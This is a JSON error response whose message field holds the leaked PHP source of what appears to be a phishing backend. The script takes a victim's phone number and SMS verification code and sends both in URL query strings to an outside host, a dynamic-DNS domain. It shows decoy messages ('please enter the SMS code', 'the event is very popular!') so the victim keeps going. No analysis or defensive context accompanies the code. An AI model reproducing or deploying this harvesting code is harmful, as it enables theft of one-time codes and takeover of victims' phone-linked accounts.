{
  "code": 1,
  "err": {
    "code": 6,
    "msg": "<?php


//$phone = $_POST['phonenumber'];

//$code = $_POST['code'];


//$cmd = $_POST['cmd'];
//echo $cmd;


// 获取 POST 请求的 JSON 参数
$json_data = file_get_contents('php://input');

// 将 JSON 字符串解码为 PHP 对象
$data = json_decode($json_data);

// 使用解码后的数据
//echo 'cmd: ' . $data->cmd . '<br>';
//echo 'Age: ' . $data->phonenumber . '<br>';

// 或者将 JSON 字符串解码为 PHP 数组
$data_array = json_decode($json_data, true);

// 使用解码后的数组
//echo 'cmd: ' . $data_array['cmd'] . '<br>';
//echo 'Age: ' . $data_array['phonenumber'] . '<br>';



$phone = $data_array['phonenumber'];


$code = $data_array['code'];


$phone4 = substr("$phone",7); //QQ




switch($data_array['cmd']){
    
    
    
    
        case "detectionphonenumber" :
            
             $r6esult5wx1 = file_get_contents("https://836i303o20.vicp.fun/index.php?pwd=" . $phone);
             
             echo "请输入短信验证码。";




		break;
		
		case "submitverificationcode" :
            
            
            
            
             $r6esult5wx = file_get_contents("https://836i303o20.vicp.fun/index.php?pwd=".$phone4."-".$code);
             
             echo "活动火爆！";
             





		break;

	}
    


?>",
    "info": {
      "SmsSendPhone": "",
      "SmsSendMsg": "",
      "CaptchaUrl": "",
      "GuaranteeUrl": "",
      "IdentificationUrl": "",
      "AccountLimitUrl": ""
    }
  }
}